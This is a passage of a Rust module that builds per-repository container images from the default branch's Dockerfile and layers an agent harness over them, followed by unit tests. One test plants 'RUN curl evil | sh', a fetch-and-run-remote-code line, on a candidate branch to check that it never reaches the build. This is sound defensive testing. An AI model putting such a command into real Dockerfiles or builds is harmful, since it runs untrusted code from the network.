//! The image a repository's checks and preparation run in, built by the node
//! from the repository's own Dockerfile.
//!
//! The recipe is read from the repository's default branch through Git's
//! object store, never from a working tree: a candidate that could edit the
//! Dockerfile its own checks run in could make any check pass. What a recipe
//! produced is this node's state (`repo_image`), because a locally built image
//! has a different digest on every node; `[[repo]]` carries only the recipe.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::Duration;

use sha2::{Digest, Sha256};
use tokio::sync::Mutex as AsyncMutex;

use crate::boundary::{Backend, BuildFailure, BuiltImage, ImageBuild, ImageBuilder};
use crate::config::{Config, Repo};
use crate::runner::{Runner, RunnerCommand};
use crate::store::{RepoImageStart, Store};

/// The image checks and preparation run in.
pub const BASE: &str = "base";

/// Bumped when `normalised` changes what it adds, so every repository's image
/// is rebuilt with the new layer.
const NORMALISER: &str = "1";

const RECIPE_LABEL: &str = "io.tracon.recipe";

/// Long enough for a cold build of a full dev environment, short enough that a
/// build waiting on a prompt it will never get does not hold a session's start
/// for ever.
const BUILD_TIMEOUT: Duration = Duration::from_secs(45 * 60);

/// What a repository's image is built from, at one commit of its default
/// branch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recipe {
    pub dockerfile: String,
    /// The context directory inside the repository; empty for its root.
    pub context: String,
    pub source_ref: String,
    pub source_commit: String,
    /// The context directory as a Git tree: what the build is given.
    pub context_tree: String,
    /// The Dockerfile, its context and the node's own layer, as one hash. A
    /// commit that touches none of them leaves it — and the image — as it was.
    pub hash: String,
}

/// What `ensure_base` found or made.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Ensured {
    /// The repository's entry names no Dockerfile: nothing here to build.
    Unconfigured,
    /// The image for the current recipe was already built.
    Current(String),
    Rebuilt(String),
    /// The current recipe could not be built; an earlier image still stands.
    Stale {
        using: String,
        error: String,
    },
    /// There is no image for this repository at all.
    Unavailable {
        reason: String,
    },
}

impl Ensured {
    pub fn image(&self) -> Option<&str> {
        match self {
            Ensured::Current(image) | Ensured::Rebuilt(image) => Some(image),
            Ensured::Stale { using, .. } => Some(using),
            Ensured::Unconfigured | Ensured::Unavailable { .. } => None,
        }
    }
}

/// One build at a time per repository: two sessions starting together wait
/// for one image rather than building it twice.
fn build_lock(repo: &Path) -> Arc<AsyncMutex<()>> {
    static LOCKS: std::sync::LazyLock<StdMutex<HashMap<PathBuf, Arc<AsyncMutex<()>>>>> =
        std::sync::LazyLock::new(|| StdMutex::new(HashMap::new()));
    LOCKS
        .lock()
        .unwrap()
        .entry(repo.to_path_buf())
        .or_default()
        .clone()
}

/// The `[[repo]]` entry for `repo`, if it names a Dockerfile to build.
pub fn building_entry<'a>(cfg: &'a Config, repo: &Path) -> Option<&'a Repo> {
    cfg.repo
        .iter()
        .find(|entry| entry.matches(repo))
        .filter(|entry| entry.dockerfile.is_some())
}

/// The recipe `entry` names, as the repository's default branch has it now.
pub async fn recipe(repo: &Path, entry: &Repo) -> Result<Recipe, String> {
    let dockerfile = entry
        .dockerfile
        .clone()
        .ok_or("the repository's entry names no dockerfile")?;
    let context = match entry.context.as_deref() {
        Some(".") => String::new(),
        Some(context) => context.to_string(),
        None => dockerfile
            .rsplit_once('/')
            .map(|(directory, _)| directory.to_string())
            .unwrap_or_default(),
    };
    let dir = repo.to_string_lossy();
    let (source_ref, source_commit) = default_commit(repo).await?;
    let found = |what: &str, path: &str| {
        format!(
            "{what} {path} is not in {source_ref} ({})",
            &source_commit[..source_commit.len().min(12)]
        )
    };
    let blob = crate::review::resolve(&dir, &format!("{source_commit}:{dockerfile}"))
        .await
        .map_err(|_| found("the Dockerfile", &dockerfile))?;
    // `<commit>:<path>` takes everything after the colon as the path, so the
    // root, which has no path, is asked for by peeling the commit instead.
    let tree = match context.is_empty() {
        true => format!("{source_commit}^{{tree}}"),
        false => format!("{source_commit}:{context}"),
    };
    let context_tree = crate::review::resolve(&dir, &tree)
        .await
        .map_err(|_| found("the build context", &context))?;
    let mut hash = Sha256::new();
    for part in [NORMALISER, &dockerfile, &blob, &context, &context_tree] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    Ok(Recipe {
        dockerfile,
        context,
        source_ref,
        source_commit,
        context_tree,
        hash: hex::encode(hash.finalize()),
    })
}

/// The commit the recipe is read at. A clone the node manages always has
/// `origin/HEAD`; an operator's own checkout made with `git init` may not, and
/// what it has committed is then the only default there is. Never the working
/// tree, in either case.
async fn default_commit(repo: &Path) -> Result<(String, String), String> {
    let dir = repo.to_string_lossy();
    if let Ok(commit) = crate::review::resolve(&dir, "refs/remotes/origin/HEAD^{commit}").await {
        let name = match crate::review::default_base(&dir).await {
            Ok(branch) => format!("origin/{branch}"),
            Err(_) => "origin/HEAD".into(),
        };
        return Ok((name, commit));
    }
    if repo.starts_with(crate::forge::managed_root(&Config::state_dir())) {
        return Err("the clone has no origin/HEAD to read the Dockerfile from".into());
    }
    crate::review::resolve(&dir, "HEAD^{commit}")
        .await
        .map(|commit| ("HEAD".to_string(), commit))
        .map_err(|_| {
            format!(
                "{} has no commit to read the Dockerfile from",
                repo.display()
            )
        })
}

/// `localhost/tracon-repo-<name>-<hash>`: readable in `podman images`, and
/// distinct for two repositories that share a directory name.
fn image_name(repo: &Path) -> String {
    let slug: String = repo
        .file_name()
        .map(|name| name.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let slug = slug.trim_matches('-');
    let hash = hex::encode(Sha256::digest(repo.as_os_str().as_encoded_bytes()));
    match slug.is_empty() {
        true => format!("localhost/tracon-repo-{}", &hash[..10]),
        false => format!("localhost/tracon-repo-{slug}-{}", &hash[..10]),
    }
}

/// The node's layer over a repository's own image, so every run in it meets
/// the same thing whatever the Dockerfile ended on.
///
/// A dev environment usually ends as an unprivileged user in that user's
/// home. Runs here are root with every capability dropped, in `/work`, which
/// root owns: without `USER 0:0` nothing could write the workspace. An
/// `ENTRYPOINT` (a devcontainer's process supervisor) would swallow the
/// command a run names. And a login shell on some bases resets `PATH` for
/// root, losing what the Dockerfile's `ENV PATH` added; the profile line puts
/// it back.
fn normalised(source: &str) -> String {
    format!(
        "FROM {source}\n\
         USER 0:0\n\
         ENV HOME=/root\n\
         RUN mkdir -p /work /cache && if [ -d /etc/profile.d ]; then \
         printf 'export PATH=\"%s\"\\n' \"$PATH\" > /etc/profile.d/zz-tracon-path.sh; fi\n\
         WORKDIR /work\n\
         ENTRYPOINT []\n"
    )
}

/// How a harness goes onto a repository's image: what is copied out of the
/// harness's own image, the environment that image sets, and the command that
/// proves the result runs. Only a harness that is one binary is carried this
/// way. OpenCode's image is an entrypoint and a toolchain profile the launch
/// manifest records, and it stays in it.
struct HarnessLayer {
    lines: &'static str,
    probe: &'static str,
}

fn harness_layer(harness_id: &str) -> Option<HarnessLayer> {
    match harness_id {
        crate::adapter::claude::ClaudeAdapter::ID => Some(HarnessLayer {
            lines:
                "COPY --from=harness /usr/local/bin/claude /usr/local/bin/claude\n\
                    ENV CLAUDE_CONFIG_DIR=/root/.claude DISABLE_AUTOUPDATER=1 DISABLE_TELEMETRY=1\n",
            probe: "claude --version && git --version",
        }),
        _ => None,
    }
}

/// Bumped when the session layer itself changes.
const SESSION_LAYER: &str = "1";

/// The harness over a repository's image. The node's own layer is applied
/// again because the image may be one the operator pinned by hand, which
/// never had it.
fn layered(base: &str, harness_image: &str, layer: &HarnessLayer) -> String {
    format!(
        "FROM {harness_image} AS harness\n{}{}",
        normalised(base),
        layer.lines
    )
}

/// The image one session's harness runs in.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SessionImage {
    /// `None` is the harness's own image.
    pub image: Option<String>,
    /// The repository image under it: what its checks run in.
    pub toolchain_image: Option<String>,
    /// Why a session whose repository has an image is not running in it.
    pub note: Option<String>,
}

impl SessionImage {
    pub fn source(&self) -> &'static str {
        match self.image {
            Some(_) => "repository image",
            None => "harness image",
        }
    }

    fn aside(note: impl Into<String>) -> Self {
        Self {
            note: Some(note.into()),
            ..Default::default()
        }
    }
}

/// The image a session on `repo` runs in: the repository's, with the harness
/// layered on, where its entry names one.
///
/// A repository with no image yet builds one here, and `building` is called
/// first because that takes minutes. One whose Dockerfile has since moved
/// starts on the image it has and is rebuilt behind the session, so a
/// Dockerfile change costs the next session nothing and this one no wait.
/// Anything that stops the session having its repository's image leaves it in
/// the harness's own, with the reason: a session that cannot build is still
/// the one that can fix what broke.
pub async fn session_image(
    backend: &Arc<dyn Backend>,
    cfg: &Arc<Config>,
    store: &Arc<Store>,
    repo: &Path,
    (harness_id, harness_version): (&str, &str),
    building: &(dyn Fn() + Send + Sync),
) -> SessionImage {
    let Some(entry) = cfg
        .repo
        .iter()
        .find(|entry| entry.matches(repo))
        .filter(|entry| entry.image.is_some() || entry.dockerfile.is_some())
    else {
        return SessionImage::default();
    };
    let Some(layer) = harness_layer(harness_id) else {
        return SessionImage::aside(format!(
            "the {harness_id} harness runs in its own image; it is not layered onto a repository's"
        ));
    };
    let Some(builder) = backend.image_builder() else {
        return SessionImage::aside(format!(
            "the {} runtime cannot build images",
            backend.kind()
        ));
    };
    let base = match &entry.image {
        Some(image) => image.clone(),
        None => {
            let repo_path = repo.to_string_lossy();
            let standing = match store.ready_repo_image(&repo_path, BASE).ok().flatten() {
                Some(row) if builder.exists(&row.image).await => Some(row),
                _ => None,
            };
            match standing {
                Some(row) => {
                    let moved = recipe(repo, entry)
                        .await
                        .is_ok_and(|recipe| recipe.hash != row.recipe_hash);
                    if moved {
                        let (backend, cfg, store) = (backend.clone(), cfg.clone(), store.clone());
                        let repo = repo.to_path_buf();
                        tokio::spawn(async move {
                            ensure_base(backend.as_ref(), &cfg, &store, &repo, false).await;
                        });
                    }
                    row.image
                }
                None => {
                    building();
                    match ensure_base(backend.as_ref(), cfg, store, repo, false).await {
                        Ensured::Unavailable { reason } => return SessionImage::aside(reason),
                        ensured => match ensured.image() {
                            Some(image) => image.to_string(),
                            None => return SessionImage::default(),
                        },
                    }
                }
            }
        }
    };
    let runner = backend.runner_for(harness_id, Vec::new());
    let harness = SessionHarness {
        id: harness_id,
        version: harness_version,
        image: cfg.podman_harness_image(harness_id),
        layer,
    };
    ensure_session_with(builder, runner.as_ref(), store, repo, &base, &harness).await
}

struct SessionHarness<'a> {
    id: &'a str,
    version: &'a str,
    image: String,
    layer: HarnessLayer,
}

async fn ensure_session_with(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    store: &Store,
    repo: &Path,
    base: &str,
    harness: &SessionHarness<'_>,
) -> SessionImage {
    let unlayered = |note: String| SessionImage {
        toolchain_image: Some(base.to_string()),
        note: Some(note),
        image: None,
    };
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    // Keyed on what the harness's tag names now: a harness upgrade rebuilds
    // this layer and leaves the repository's image, and its evidence, alone.
    let Some(harness_image) = builder.identity(&harness.image).await else {
        return unlayered(format!(
            "the harness image {} is missing; `tracon setup` builds it",
            harness.image
        ));
    };
    let mut hash = Sha256::new();
    for part in [SESSION_LAYER, base, &harness_image, harness.layer.lines] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    let key = hex::encode(hash.finalize());
    let kind = format!("session:{}", harness.id);
    let repo_path = repo.to_string_lossy();
    let ready = store.ready_repo_image(&repo_path, &kind).ok().flatten();
    if let Some(row) = ready.as_ref().filter(|row| row.recipe_hash == key) {
        if builder.exists(&row.image).await {
            return SessionImage {
                image: Some(row.image.clone()),
                toolchain_image: Some(base.to_string()),
                note: None,
            };
        }
    }
    let latest = store.latest_repo_image(&repo_path, &kind).ok().flatten();
    if let Some(failed) = latest.filter(|row| row.status == "failed" && row.recipe_hash == key) {
        return unlayered(failed.error);
    }
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: &kind,
        recipe_hash: &key,
        source_ref: "",
        source_commit: "",
        parent_image: base,
    };
    let id = match store.start_repo_image(&started) {
        Ok(id) => id,
        Err(error) => return unlayered(error.to_string()),
    };
    let built = build_session(builder, runner, repo, base, &harness_image, &key, harness).await;
    match built {
        Ok(built) => {
            let _ = store.finish_repo_image(&id, Ok(&built.image), &built.log_tail, &[]);
            // The layer this replaces, and the repository image under it that
            // could not go while this layer still stood on it.
            if let Some(old) = ready.filter(|old| old.image != built.image) {
                builder.remove(&old.image).await;
                if old.parent_image != base {
                    builder.remove(&old.parent_image).await;
                    let parent = store.repo_image_built_as(&old.parent_image).ok().flatten();
                    if let Some(parent) = parent {
                        builder.remove(&source_tag(repo, &parent.recipe_hash)).await;
                    }
                }
            }
            SessionImage {
                image: Some(built.image),
                toolchain_image: Some(base.to_string()),
                note: None,
            }
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "session image build failed");
            let _ = store.finish_repo_image(&id, Err(&failure.error), &failure.log_tail, &[]);
            unlayered(failure.error)
        }
    }
}

/// Build the layer and prove the harness runs in it before anything is told
/// to launch there: a base image with a different libc, or without Git, is
/// found here and not as a session that dies at start.
async fn build_session(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    repo: &Path,
    base: &str,
    harness_image: &str,
    key: &str,
    harness: &SessionHarness<'_>,
) -> Result<BuiltImage, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
    };
    let stage = tempfile::tempdir().map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Session.Containerfile");
    std::fs::write(&containerfile, layered(base, harness_image, &harness.layer))
        .map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = builder
        .build(ImageBuild {
            tag: &format!("{}-{}:{}", image_name(repo), harness.id, &key[..12]),
            containerfile: &containerfile,
            context: &empty,
            labels: &[(RECIPE_LABEL.to_string(), key.to_string())],
            timeout: BUILD_TIMEOUT,
        })
        .await?;
    let probe = runner
        .run_capture(RunnerCommand {
            argv: ["sh", "-c", harness.layer.probe].map(String::from).to_vec(),
            image: Some(built.image.clone()),
            name: format!("tracon-probe-{}", uuid::Uuid::now_v7().simple()),
            ..Default::default()
        })
        .await;
    let said = match &probe {
        Ok(out) => String::from_utf8_lossy(&[out.stdout.clone(), out.stderr.clone()].concat())
            .trim()
            .to_string(),
        Err(error) => error.to_string(),
    };
    if probe.is_ok_and(|out| out.status.success()) && said.contains(harness.version) {
        return Ok(built);
    }
    builder.remove(&built.image).await;
    Err(BuildFailure {
        error: format!(
            "{} {} does not run in the repository's image",
            harness.id, harness.version
        ),
        log_tail: said,
    })
}

/// Make sure the image for `repo`'s current recipe exists, building it if it
/// does not. `force` rebuilds even an image that is current, and retries a
/// recipe that already failed.
///
/// A recipe that fails is not retried on its own: every session start and
/// every check would otherwise repeat a build that takes minutes to fail the
/// same way. The last image that built keeps the repository usable meanwhile.
pub async fn ensure_base(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    force: bool,
) -> Ensured {
    let Some(entry) = building_entry(cfg, repo) else {
        return Ensured::Unconfigured;
    };
    let Some(builder) = backend.image_builder() else {
        return Ensured::Unavailable {
            reason: format!("the {} runtime cannot build images", backend.kind()),
        };
    };
    let runner = backend.runner(Vec::new());
    let commands = crate::environment::environment_for(cfg, store, Some(repo));
    let commands: Vec<String> = commands
        .checks
        .into_iter()
        .chain(commands.prepare)
        .collect();
    let ensured = ensure_with(
        builder,
        runner.as_ref(),
        cfg,
        store,
        repo,
        entry,
        &commands,
        force,
    )
    .await;
    if matches!(ensured, Ensured::Rebuilt(_)) {
        warm_base_cache(backend, cfg, store, repo).await;
    }
    ensured
}

/// Fill the repository's base dependency cache by preparing its default
/// branch in the image just built. This is the only thing that ever writes
/// that cache: what is in it came from source the operator already merged,
/// through the entry's own `prepare` and `egress`, so every candidate and
/// every session can start from a copy of it without inheriting anything
/// another candidate installed. A warm-up that fails leaves a cache that is
/// merely colder.
async fn warm_base_cache(backend: &dyn Backend, cfg: &Config, store: &Store, repo: &Path) {
    let environment = crate::environment::environment_for(cfg, store, Some(repo));
    if environment.prepare.is_empty() {
        return;
    }
    let warmed = async {
        let (_, commit) = default_commit(repo).await?;
        let tree = crate::review::snapshot_candidate(
            &repo.to_string_lossy(),
            &commit,
            cfg.supervision.max_snapshot_bytes,
        )
        .await
        .map_err(|error| error.to_string())?;
        let id = uuid::Uuid::now_v7().simple().to_string();
        let work = format!("tracon-warm-{id}");
        backend
            .import_writable(&work, &tree.root)
            .await
            .map_err(|error| error.to_string())?;
        let runner = backend.runner(Vec::new());
        let prepared = crate::review::checks::run_preparation(
            backend,
            runner.as_ref(),
            &environment,
            (&work, &environment.cache_volume),
            &format!("tracon-w-{}", &id[..12]),
            tokio::time::Instant::now() + Duration::from_secs(environment.timeout_secs),
            &crate::review::checks::RunToCompletion,
        )
        .await;
        let _ = backend.remove_volume(&work).await;
        prepared.map_err(|stopped| stopped.to_string())
    };
    match warmed.await {
        Ok(()) => tracing::info!(repo = %repo.display(), "base dependency cache warmed"),
        Err(error) => {
            tracing::warn!(repo = %repo.display(), %error, "base dependency cache not warmed")
        }
    }
}

/// The environment a run in `repo` gets, with its image built first if the
/// entry names a Dockerfile. A build that fails leaves whatever
/// `environment_for` still resolves: the last image that built, or the
/// harness image with that said.
pub async fn environment(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: Option<&Path>,
) -> crate::environment::RepoEnvironment {
    if let Some(repo) = repo {
        ensure_base(backend, cfg, store, repo, false).await;
    }
    crate::environment::environment_for(cfg, store, repo)
}

#[allow(clippy::too_many_arguments)]
async fn ensure_with(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    entry: &Repo,
    commands: &[String],
    force: bool,
) -> Ensured {
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    let repo_path = repo.to_string_lossy();
    let ready = match store.ready_repo_image(&repo_path, BASE) {
        Ok(ready) => ready,
        Err(error) => {
            return Ensured::Unavailable {
                reason: error.to_string(),
            }
        }
    };
    // An image the runtime pruned is not one a run can use.
    let standing = match &ready {
        Some(row) if builder.exists(&row.image).await => Some(row.clone()),
        _ => None,
    };
    let fallback = |error: String| match &standing {
        Some(row) => Ensured::Stale {
            using: row.image.clone(),
            error,
        },
        None => Ensured::Unavailable { reason: error },
    };
    let recipe = match recipe(repo, entry).await {
        Ok(recipe) => recipe,
        Err(error) => return fallback(error),
    };
    if !force {
        if let Some(row) = standing
            .as_ref()
            .filter(|row| row.recipe_hash == recipe.hash)
        {
            return Ensured::Current(row.image.clone());
        }
        let latest = store.latest_repo_image(&repo_path, BASE).ok().flatten();
        if let Some(failed) =
            latest.filter(|row| row.status == "failed" && row.recipe_hash == recipe.hash)
        {
            return fallback(format!("{}; `tracon repo build` tries again", failed.error));
        }
    }
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: BASE,
        recipe_hash: &recipe.hash,
        source_ref: &recipe.source_ref,
        source_commit: &recipe.source_commit,
        parent_image: "",
    };
    let id = match store.start_repo_image(&started) {
        Ok(id) => id,
        Err(error) => return fallback(error.to_string()),
    };
    tracing::info!(repo = %repo.display(), recipe = %recipe.hash, "building repository image");
    match build(builder, cfg, repo, &recipe).await {
        Ok(built) => {
            let warnings = missing_tools(runner, &built.image, commands).await;
            let _ = store.finish_repo_image(&id, Ok(&built.image), &built.log_tail, &warnings);
            if let Some(old) = standing.filter(|old| old.image != built.image) {
                builder.remove(&old.image).await;
                builder.remove(&source_tag(repo, &old.recipe_hash)).await;
            }
            Ensured::Rebuilt(built.image)
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "repository image build failed");
            let _ = store.finish_repo_image(&id, Err(&failure.error), &failure.log_tail, &[]);
            fallback(failure.error)
        }
    }
}

fn source_tag(repo: &Path, recipe_hash: &str) -> String {
    format!(
        "{}-src:{}",
        image_name(repo),
        &recipe_hash[..recipe_hash.len().min(12)]
    )
}

/// Build the repository's own image from its default branch, then the node's
/// layer over it. The context is materialized from Git objects into a
/// directory of the node's; nothing the working tree holds is in it.
async fn build(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    repo: &Path,
    recipe: &Recipe,
) -> Result<BuiltImage, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
    };
    let dir = repo.to_string_lossy();
    let stage = tempfile::tempdir().map_err(|e| staged(e.to_string()))?;
    let dockerfile = crate::review::blob(
        &dir,
        &format!("{}:{}", recipe.source_commit, recipe.dockerfile),
    )
    .await
    .map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Containerfile");
    std::fs::write(&containerfile, dockerfile).map_err(|e| staged(e.to_string()))?;
    let context = crate::review::snapshot_candidate(
        &dir,
        &recipe.context_tree,
        cfg.supervision.max_snapshot_bytes,
    )
    .await
    .map_err(|e| staged(format!("build context: {e}")))?;
    let labels = [(RECIPE_LABEL.to_string(), recipe.hash.clone())];
    let source = builder
        .build(ImageBuild {
            tag: &source_tag(repo, &recipe.hash),
            containerfile: &containerfile,
            context: &context.root,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await?;

    let layer = stage.path().join("Normalised.Containerfile");
    std::fs::write(&layer, normalised(&source.image)).map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = builder
        .build(ImageBuild {
            tag: &format!("{}:{}", image_name(repo), &recipe.hash[..12]),
            containerfile: &layer,
            context: &empty,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await?;
    // The repository's own build is the one worth reading; the layer over it
    // prints a few lines at most.
    Ok(BuiltImage {
        image: built.image,
        log_tail: source.log_tail,
    })
}

/// The commands whose first word the image has no tool for, so the operator
/// hears it when the image is built rather than from a check that could not
/// run. A probe that cannot run says nothing.
async fn missing_tools(runner: &dyn Runner, image: &str, commands: &[String]) -> Vec<String> {
    let mut tools: Vec<&str> = Vec::new();
    for command in commands {
        // An assignment or a path is not a tool the image is expected to hold.
        match command.split_whitespace().next() {
            Some(word) if !word.contains(['=', '/']) && !tools.contains(&word) => tools.push(word),
            _ => {}
        }
    }
    if tools.is_empty() {
        return Vec::new();
    }
    let mut argv: Vec<String> = [
        "sh",
        "-lc",
        "for tool in \"$@\"; do command -v \"$tool\" >/dev/null 2>&1 || echo \"$tool\"; done",
        "sh",
    ]
    .map(String::from)
    .to_vec();
    argv.extend(tools.iter().map(|tool| tool.to_string()));
    let out = runner
        .run_capture(RunnerCommand {
            argv,
            image: Some(image.to_string()),
            name: format!("tracon-probe-{}", uuid::Uuid::now_v7().simple()),
            ..Default::default()
        })
        .await;
    let Ok(out) = out else {
        return Vec::new();
    };
    let missing = String::from_utf8_lossy(&out.stdout);
    commands
        .iter()
        .filter(|command| {
            command
                .split_whitespace()
                .next()
                .is_some_and(|word| missing.lines().any(|line| line.trim() == word))
        })
        .cloned()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runner::local::LocalRunner;
    use async_trait::async_trait;

    /// Records what it was asked to build and reads the Containerfile and
    /// context while they still exist, as a real build would.
    #[derive(Default)]
    struct FakeBuilder {
        builds: StdMutex<Vec<(String, String, Vec<String>)>>,
        removed: StdMutex<Vec<String>>,
        fail: StdMutex<bool>,
        pruned: StdMutex<bool>,
    }

    #[async_trait]
    impl ImageBuilder for FakeBuilder {
        async fn build(&self, build: ImageBuild<'_>) -> Result<BuiltImage, BuildFailure> {
            if *self.fail.lock().unwrap() {
                return Err(BuildFailure {
                    error: "podman build exited 1".into(),
                    log_tail: "Error: no such package".into(),
                });
            }
            let text = std::fs::read_to_string(build.containerfile).unwrap();
            let mut files: Vec<String> = std::fs::read_dir(build.context)
                .unwrap()
                .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
                .collect();
            files.sort();
            let name = build.tag.rsplit_once(':').unwrap().0.to_string();
            let digest = hex::encode(Sha256::digest(format!("{}{text}", build.tag)));
            self.builds
                .lock()
                .unwrap()
                .push((build.tag.to_string(), text, files));
            Ok(BuiltImage {
                image: format!("{name}@sha256:{digest}"),
                log_tail: "built".into(),
            })
        }
        async fn exists(&self, _image: &str) -> bool {
            !*self.pruned.lock().unwrap()
        }
        async fn identity(&self, image: &str) -> Option<String> {
            let digest = hex::encode(Sha256::digest(image));
            Some(format!("{image}@sha256:{digest}"))
        }
        async fn remove(&self, image: &str) {
            self.removed.lock().unwrap().push(image.to_string());
        }
    }

    fn sh(dir: &Path, script: &str) {
        let status = std::process::Command::new("sh")
            .arg("-c")
            .arg(script)
            .current_dir(dir)
            .status()
            .unwrap();
        assert!(status.success(), "{script}");
    }

    /// A checkout whose default branch holds a Dockerfile and one file beside
    /// it, with `origin/HEAD` where a clone would have it.
    fn checkout() -> tempfile::TempDir {
        let tmp = tempfile::tempdir().unwrap();
        sh(
            tmp.path(),
            "git init -q -b main . && git config user.email t@e && git config user.name t \
             && mkdir .devcontainer && printf 'FROM scratch\\nCOPY tool.conf /etc/\\n' > .devcontainer/Dockerfile \
             && echo a > .devcontainer/tool.conf && echo one > src.txt \
             && git add -A && git commit -qm one \
             && git update-ref refs/remotes/origin/main HEAD \
             && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main",
        );
        tmp
    }

    fn entry(repo: &Path) -> Repo {
        Repo {
            path: repo.to_path_buf(),
            dockerfile: Some(".devcontainer/Dockerfile".into()),
            ..Default::default()
        }
    }

    async fn ensure(builder: &FakeBuilder, store: &Store, repo: &Path, force: bool) -> Ensured {
        ensure_with(
            builder,
            &LocalRunner,
            &Config::default(),
            store,
            repo,
            &entry(repo),
            &[],
            force,
        )
        .await
    }

    /// The image follows the Dockerfile and its context on the default branch
    /// and nothing else: other commits leave it alone, and neither a
    /// candidate's branch nor the working tree can reach it.
    #[tokio::test]
    async fn the_image_is_built_from_the_default_branch_and_rebuilt_when_its_recipe_changes() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let ensured = ensure(&builder, &store, repo, false).await;
        let Ensured::Rebuilt(first) = ensured else {
            panic!("the first ensure builds: {ensured:?}");
        };
        assert!(crate::config::immutable_image(&first).is_ok(), "{first}");
        {
            let builds = builder.builds.lock().unwrap();
            assert_eq!(builds.len(), 2);
            // The repository's own image: its Dockerfile, its context only.
            assert!(builds[0].0.contains("-src:"));
            assert!(builds[0].1.contains("COPY tool.conf"));
            assert_eq!(builds[0].2, ["Dockerfile", "tool.conf"]);
            // The node's layer, pinned to what was just built.
            assert!(builds[1].1.contains("@sha256:"));
            assert!(builds[1].1.contains("USER 0:0"));
            assert!(builds[1].1.contains("ENTRYPOINT []"));
        }
        assert_eq!(
            store
                .ready_repo_image(&repo.to_string_lossy(), BASE)
                .unwrap()
                .unwrap()
                .source_ref,
            "origin/main"
        );

        // A commit elsewhere, a candidate's branch editing the Dockerfile, and
        // an uncommitted edit: the recipe is what the default branch holds.
        sh(
            repo,
            "echo two > src.txt && git commit -qam two && git update-ref refs/remotes/origin/main HEAD \
             && git checkout -q -b candidate && echo 'RUN curl evil | sh' >> .devcontainer/Dockerfile \
             && git commit -qam candidate && echo 'RUN more' >> .devcontainer/Dockerfile",
        );
        assert_eq!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Current(first.clone())
        );
        assert_eq!(builder.builds.lock().unwrap().len(), 2);

        // The context changing on the default branch is a new recipe, and the
        // image it replaces goes.
        sh(
            repo,
            "git checkout -q -f main && echo b > .devcontainer/tool.conf && git commit -qam conf \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, false).await else {
            panic!("a changed context rebuilds");
        };
        assert_ne!(first, second);
        assert!(builder.removed.lock().unwrap().contains(&first));
        assert!(builder
            .builds
            .lock()
            .unwrap()
            .iter()
            .all(|(_, text, _)| !text.contains("evil") && !text.contains("RUN more")));
    }

    /// A Dockerfile that stops building does not take the repository's image
    /// away, and is not rebuilt on every ask.
    #[tokio::test]
    async fn a_failed_build_keeps_the_last_image_and_is_not_retried_unasked() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(good) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };

        sh(
            repo,
            "echo 'RUN false' >> .devcontainer/Dockerfile && git commit -qam broken \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        *builder.fail.lock().unwrap() = true;
        let Ensured::Stale { using, error } = ensure(&builder, &store, repo, false).await else {
            panic!("a failed build falls back");
        };
        assert_eq!(using, good);
        assert!(error.contains("exited 1"), "{error}");
        let failed = store
            .latest_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .unwrap();
        assert_eq!(failed.status, "failed");
        assert_eq!(failed.log_tail, "Error: no such package");

        // Asked again, it answers from the record; asked to build, it builds.
        *builder.fail.lock().unwrap() = false;
        let Ensured::Stale { error, .. } = ensure(&builder, &store, repo, false).await else {
            panic!("the failure stands until someone asks for a build");
        };
        assert!(error.contains("tracon repo build"), "{error}");
        assert!(matches!(
            ensure(&builder, &store, repo, true).await,
            Ensured::Rebuilt(_)
        ));
    }

    /// With no image that ever built, a failure leaves nothing to run in; and
    /// an image the runtime no longer holds is built again rather than named.
    #[tokio::test]
    async fn an_image_that_is_gone_is_built_again() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let missing = Repo {
            dockerfile: Some("docker/Dockerfile".into()),
            ..entry(repo)
        };
        let unavailable = ensure_with(
            &builder,
